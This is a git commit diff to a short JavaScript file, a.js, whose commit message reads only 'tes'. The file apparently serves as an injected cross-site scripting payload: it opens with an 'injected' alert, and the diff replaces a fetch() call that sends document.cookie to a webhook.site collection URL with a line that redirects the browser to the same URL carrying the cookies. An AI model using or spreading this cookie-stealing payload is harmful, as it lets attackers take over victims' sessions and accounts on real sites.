dd62deac360ecb6405db0b0bcf915041a51049d2
HerLove12 <95884923+HerLove12@users.noreply.github.com>
2024-04-02 15:29:37 +0200

    tes

--- a.js
+++ a.js
@@ -1,19 +1,3 @@
 alert("injected");
 
-fetch("https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?x="+document.cookie, {
-  method: "GET",
-})
-.then(response => {
-  if (!response.ok) {
-    throw new Error(`HTTP error! Status: ${response.status}`);
-  }
-  return response.text();
-})
-.then(html => {
-  console.log(html); // Log the HTML code of the page
-})
-.catch(error => {
-  console.error('Fetch Error:', error);
-});
-
-alert("req sent");
+window.location="	https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?x=".concat(document.cookie);
